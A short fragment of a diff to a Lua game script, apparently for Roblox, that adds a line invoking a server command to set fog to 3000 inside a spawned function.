+				RequestCommand:InvokeServer(";fog 3000")
+				break
+			end
+		end
+		
 	end)
 end;
 task.spawn(C_12c);
